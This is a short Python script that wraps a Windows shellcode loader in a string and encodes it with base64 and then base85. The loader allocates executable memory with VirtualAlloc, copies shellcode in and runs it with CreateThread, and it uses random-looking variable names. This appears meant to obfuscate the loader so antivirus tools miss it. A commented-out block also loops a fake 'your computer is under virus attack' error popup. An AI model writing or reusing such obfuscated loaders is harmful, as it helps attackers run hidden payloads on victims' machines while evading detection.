# import tkinter.messagebox
# while True:
#     tkinter.messagebox.showerror('window错误','你的电脑正在受到病毒攻击')
import base64
x="""ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_int64
wiseZERld = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int64(wiseZERld),shellcode,ctypes.c_int(len(shellcode)))
CVXWRcjqxL = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int64(wiseZERld),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(CVXWRcjqxL),ctypes.c_int(-1))
"""
ex=base64.b85encode(base64.b64encode(x.encode('utf-8')))
print(ex)
